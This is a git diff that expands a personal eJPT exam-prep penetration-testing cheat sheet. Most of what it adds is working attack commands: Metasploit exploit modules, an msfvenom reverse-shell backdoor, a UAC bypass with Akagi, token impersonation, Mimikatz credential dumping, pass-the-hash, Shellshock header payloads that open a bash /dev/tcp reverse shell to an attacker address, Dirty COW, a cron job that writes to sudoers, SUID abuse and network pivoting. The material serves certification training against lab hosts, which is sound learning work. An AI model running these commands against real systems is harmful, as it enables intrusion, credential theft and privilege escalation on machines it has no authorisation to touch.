@@ -1,7 +1,4 @@
-# eJPT Cheat Sheet
-
-This repo has the cheatsheet that I made during my eJPT exam prep...
-
+# eJPT Cheat Sheet:
 
 #### Find IP address of a website:
 
@@ -181,14 +178,14 @@ sudo netdicover -i eth0 -r 192.168.3.0/24
 - `--osscan-guess`: OS Version probability.
 
 Example:
-```shell
+```bash
 nmap -sS -p 1-100,443 192.168.1.13,14
 ```
 
 Tip: Use `--reason` to show the explanation of why a port is marked open or closed  
 Tip: Use `--open` to show only open, open filtered, and unfiltered ports.
 
-```shell
+```console
 nmap -T4 -sS -sV --version-intensity 8 <ip-address>
 ```
 
@@ -614,6 +611,24 @@ dirb http://<ip-address> /usr/share/metasploit-framework/data/wordlists/director
 ```
 
 > The command runs `dirb`, a web content scanner, against the specified IP address using a wordlist from Metasploit (`directory.txt`) to discover hidden directories and files on the target web server.
+
+```msfconsole
+use exploit/windows/http/rejetto_hfs_exec 
+show options
+set RHOST <ip-address>
+exploit
+```
+
+> This module can be used to exploit rejetto http file server. 
+
+```msfconsole
+use exploit/windows/http/badblue_passthru
+show options
+set RHOST <ip-address>
+exploit
+```
+
+> This can be used to exploit bad blue service.
 
 #### MYSQL Commands:
 
@@ -1055,5 +1070,434 @@ exploit
 
 > Can be used to execute remote commands.
 
+#### Windows Kernel Exploits:
+
+**Note:**
+
+> Everything demonstrated here after is basically done after the initial foothold.
+
+This is a built in meterpreter command i.e. `getsystem` that uses some techniques to escalate the privileges. It can used in some cases as well. 
+
+```msfconsole
+use post/multi/recon/local_exploit_suggester
+show options
+set SESSION <session-ID>
+run
+```
+
+> It will tell the exploit modules that you can try to elevate your privileges.
+
+```msfconsole
+use exploit/windows/local/ms16_014_wmi_recv_notif
+show options
+set SESSION <session-ID>
+set LPORT <port-number>
+exploit
+```
+
+> It can be used to escalate privileges in vulnerable windows 7 machine.
+
+```Shell
+git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester
+```
+
+> This tool compares a target path levels with Microsoft vulnerability database in order to detect missing patches on the target that can be then exploited.
+
+**How to use:**
+
+First get the system info from the meterpreter session by `shell > systeminfo`. Then copy this info in a text file and then pass this as an argument to the tool.
+
+**Step 01:**
+
+```Shell
+$ ./windows-exploit-suggester.py --update
+[*] initiating...
+[*] successfully requested base url
+[*] scraped ms download url
+[+] writing to file 2014-06-06-mssb.xlsx
+[*] done
+```
+
+**Step 02:**
+
+```Shell
+install python-xlrd, $ pip install xlrd --upgrade
+```
+
+**Step 03:**
+
+```Shell
+./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt
+```
+
+#### Bypassing UAC with UACMe:
+
+***UAC STANDS FOR USER ACCOUNT CONTROL***
+
+```meterpreter
+pgrep explorer
+migrate <process-ID>
+```
+
+> This command can be used to switch to the 64 Bit meterpreter session.
+
+```Shell
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.31.2 LPORT=4444 -f exe > 'backdoor.exe'
+```
+
+> Generating malicious executable using msfvenom.
+
+```console
+/root/Desktop/tools/UACME/Akagi64.exe
+```
+
+> Location of the `Akagi` exploit that is used to bypass UAC.
+
+```Shell
+Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe
+```
+
+> `Akagi` command is used to run the exploit by bypassing the UAC.
+
+```CMD
+ps -S lsass.exe
+migrate <process-ID>
+```
+
+> After the exploitation and meterpreter session migrate to the `lsass.exe` process.
+
+#### Access Token Impersonation:
+
+**Note:**
+
+> Everything demonstrated here after is basically done after the initial foothold.
+
+***YOU HAVE TO PERFROM THE FOLLOWING FUNCTION IN THE METERPRETER SESSION. YOU CAN TO FOLLOWING IF AND ONLT IF YOU HAVE THE `SeImpersonationPrivilages` IN THE `getprivs` SECTION***
+
+```msfconsole
+load incognito
+list_tokens -u
+impersonate_token "<group-name>\Administrator"
+getuid
+pgrep explorer
+migrate <process-id>
+```
+
+***IF YOU DONT FIND ANY PRIVILAGED TOKENS IN BOTH DELEGATION TOKENS AND IMPERSONANTION TOKENS THAN YOU HAVE TO USE THE POTATO ATTACK***
+
+#### Searching for Passwords In Windows Configuration Files:
+
+***YOU NEED ELIVATED PRIVILEGES TO DUMP HASHES***
+
+```Shell
+C:\\Windows\Panther\Unattend.xml >> in base64
+C:\\Windows\Panther\Autounattend.xml
+```
+
+> These are the configuration files that contain the user accounts and their passwords along side system configuration. In unattend the passwords are stored in base64.
+
+#### Dumping hashes with Mimikatz:
+
+**Note:**
+
+> Everything demonstrated here after is basically done after the initial foothold.
 
 
+```msfconsole
+load kiwi
+?
+creds_all
+lsa_dump_sam
+lsa_dump_secrets
+```
+
+> Dumping passwords hashes using `kiwi`.
+
+```msfconsole
+upload usr/share/windows-resources/mimikatz/mimikatz.exe
+shell
+dir
+mimikatz.exe
+privilege::debug
+lsadump::sam
+lsadump::secrets
+sekurlsa::logonpasswords
+```
+
+> Command can be used to upload the `mimikatz.exe` file and then run it in the windows shell.
+
+#### Pass-The-Hash:
+
+**Note:**
+
+> Everything demonstrated here after is basically done after the initial foothold and after getting the hashes from the kiwi module. Make sure to make a file to store all the hashes in it.
+
+
+```msfconsole
+use exploit/windows/smb/psexec
+show options
+set LPORT <some-new-port>
+set RHOST <ip-address>
+set SMBUser Administrator <any-other-user-can-be-used>
+set SMBPass <NTLM-HASH:LM-HASH>
+set target Native\ upload
+exploit
+```
+
+> Via these commands if everything goes smoothly you'll have a successful pass-the-hash attack.
+
+```Shell
+crackmapexec smb <ip-address> -u Administrator -H "<NTLM-HASH>" -x "any-command"
+```
+
+> Pass-the-hash attack using `crackmapexec`.
+
+```Shell
+ruby evil-winrm.rb -i 10.0.0.20 -u user -H <NTLM-HASH>
+```
+
+> `evil-winrm.rb` tool can be used to perform the same function.
+
+#### Linux Exploitation:
+
+#### Shell Shock:
+
+```Shell
+nmap -sV <ip-address> --script=http-shellshock --sctipt-args "http-shellshock.uri=/gettime.cgi"
+```
+
+> A shell shock vulnerability script.
+
+***TO EXPLOIT IT VIA BRUP SUITE WE HAVE TO PASS COMMANDS IN THE  USER AGENT HEADER AS SHOWN BELOW***
+
+> First send it to the repeater and then change the header in the repeater tab. 
+
+```HTTP
+User Agent: () { :; }; echo; echo; /bin/bash -c '<command>'
+User Agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/password' 
+```
+
+***FOLLOWING IS THE METHOD TO GAIN A REVERSE SHELL FROM BURP SUITE***
+
+```Shell
+nc -nvlp 1234
+```
+
+> First turn on the net cat on listening mod on port 1234.
+
+```http
+User Agent: () { :; }; echo; echo; /bin/bash -c 'bash -i>&/dev/tcp/<host-ip-addresss>/1234 0>&1'
+User Agent: () { :; }; echo; echo; /bin/bash -c 'bash -i>&/dev/tcp/192.24.241.2/1234 0>&1'
+```
+
+> This header upon running will give a reverse shell on the system.
+
+```msfconsole
+use exploit/multi/http/apache_mod_cgi_bach_env_exec
+show options
+set RHOST <ip-address>
+set TARGETURI /gettime.cgi
+exploit
+```
+
+> Module for exploitation the shellshock vulnerability. 
+
+#### SAMBA Commands:
+
+```Shell
+hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <ip-address> smb
+```
+
+> Brute force samba command.
+
+```Shell
+smbmap -H <ip-address> -u <user-name> -p password1
+```
+
+> List downs all the shares of the given user.
+
+```Shell
+smbclient //<ip-address>/<share-name> -U admin 
+```
+
+> This command be used to connect to a particular share.
+
+```Shell
+enum4linux -a <ip-address>
+```
+
+> Basic target information.
+
+```Shell
+enum4linux -a -u <user-name> -p <password> <ip-address>
+```
+
+> For a particular user.
+
+#### Linux Kernel Exploits:
+
+**Note:**
+
+> Everything demonstrated here after is basically done after the initial foothold.
+
+```meterpreter
+upload les.sh
+shell
+/bin/bash -i
+chmod +x les.sh
+./les.sh
+
+```
+
+> This script works as the exploit suggester for linux.
+
+```console
+https://www.exploit-db.com/exploits/40839
+```
+
+> This link has the exploit for the dirty cow vulnerability.
+
+```Shell
+gcc -pthread <exploit-file-name>.c -o dirty -lcrypt
+chmod +x dirty
+```
+
+> This forms the executable of the given file by the name `dirty`. After this upload the file on the machine using the meterpreter session.
+
+***IF IT ISN'T WORKING YOU CAN THEN UPLOAD THE C FILE DIRECTLY ON TO THE MACHINE AND THEN RUN THESE COMMADS THERE TO FORM AND EXECUTABLE***
+
+> After the script has ran successfully it will create a user by the name `firefart` that would have the root privileges.
+
+#### Cron Jobs
+
+> We will be targeting Cron Jobs that have been created by the `root` user in order to escalate our privileges.
+
+```Shell
+crontab -l
+```
+
+> The command to display the list of scheduled cron jobs for the current user is
+
+```Shell
+grep -nri “/tmp/message” /usr
+```
+
+> The command is used to search for the string `"/tmp/message"` within files located under the `/usr` directory.
+
+```Shell
+printf '#! /bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh
+```
+
+> Exploiting the cron jobs misconfiguration.
+
+#### Exploiting SUID Binaries:
+
+***SET OWNER USER ID***
+
+```Shell
+| -rwsr-xr-x | 1 | root  |  8344 | Sep 222  |  2018 | welcome
+```
+
+> Now here the `s` in the permissions section is the `SUID` permission. So that means it is being executed by the root privileges. 
+
+```Shell
+rm <file-name>
+cp /bin/bash <file-name>
+```
+
+> Now if we remove a file that is being run by the welcome file as shown above and make a file with the same name but with the components of `/bin/bash`. Then upon executing the `welcome` file we will get the root privileges.
+
+#### Dumping Linux Passwords Hashes:
+
+```console
+/etc/shadow
+```
+
+> This file has all the hashes for the user that are using that particular machine and this can only be accessed by a root user or a user with privileged access.
+
+```console
+root:$6$gvewkfv7o7i32ugbc328pgibcewuhjbh:45678:0:999999:7:::
+```
+
+> This is an exemplary hash 
+
+```msfconsole
+use post/linux/hashdump
+show options 
+set SESSION <session-ID>
+run
+```
+
+> This modules will also perform the same function
+
+```msfconsole
+use auxiliary/analyze/crack_linux
+set SHA512 true
+run
+```
+
+> This module can be used to crack a hash.
+
+#### SMB & NetBIOS Enumeration:
+
+```msfconsole
+msfconsole -q
+use exploit/windows/smb/psexec
+set RHOSTS demo.ine.local
+set SMBUser administrator
+set SMBPass password1
+exploit
+```
+
+> This module can be used to exploit the machine using `smb` creds.
+
+```Shell
+hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb
+```
+
+> Hydra command to brute force `smb` users pass.
+
+```cmd
+run autoroute -s 10.0.22.69/20
+```
+
+> This command is related to managing and utilizing routes within a compromised network during a penetration test. By running `autoroute -s 10.0.22.69/20`, you are instructing Metasploit to add a route to the network `10.0.16.0/20` via the compromised machine.
+
+```shell
+cat /etc/proxychains4.conf
+```
+
+> Socks proxy configuration is in this file.
+
+```msfconsole
+use auxiliary/server/socks_proxy
+show options
+set SRVPORT 9050
+set VERSION 4a 
+exploit
+jobs
+```
+
+> This module can be used to set up `socks4a` proxy chain.
+
+```Shell
+proxychains <command>
+proxychains nmap demo1.ine.local -sT -Pn -sV -p 445
+```
+
+> This is how you can run commands to other machine using `proxychains` from `metasploit`.
+
+```CMD
+net view 10.0.22.69
+```
+
+> This lists down all the shared resources (if any) between two machines on a network.
+
+```cmd
+net use D: \\10.0.22.69\Documents
+net use K: \\10.0.22.69\K$
+dir D:
+dir K:
+```
+
+> Command to load and access the shared resources.
